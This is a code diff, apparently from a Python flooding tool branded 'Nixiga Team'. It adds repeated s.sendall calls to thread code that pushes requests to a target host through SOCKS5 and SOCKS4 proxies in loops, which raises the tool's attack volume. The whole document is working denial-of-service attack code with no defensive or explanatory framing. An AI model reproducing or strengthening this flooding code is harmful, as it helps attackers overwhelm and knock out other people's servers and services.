@@ -210,6 +210,13 @@ class Socks(threading.Thread):
                 s.send(str.encode(request))
                 s.send(str.encode(request))
                 s.send(str.encode(request))
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
+                s.sendall(str.encode(request))
                 print("[!] Official Nixiga Team Community | Socks5 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                 try:
                     for y in range(multiple):
@@ -263,10 +270,18 @@ class Socks(threading.Thread):
                     s.send(str.encode(request))
                     s.send(str.encode(request))
                     s.send(str.encode(request))
+                    s.sendall(str.encode(request))
+                    s.sendall(str.encode(request))
+                    s.sendall(str.encode(request))
+                    s.sendall(str.encode(request))
+                    s.sendall(str.encode(request))
+                    s.sendall(str.encode(request))
+                    s.sendall(str.encode(request))
                     print("[!] Official Nixiga Team Community | Socks4 @ " +str(proxy[0])+ " => [" +host_url+ ":" +str(port)+ "]")
                     try:
                         for y in range(multiple):
                             s.send(str.encode(request))
+                            s.sendall(str.encode(request))
                     except:
                         try:
                             s.close()
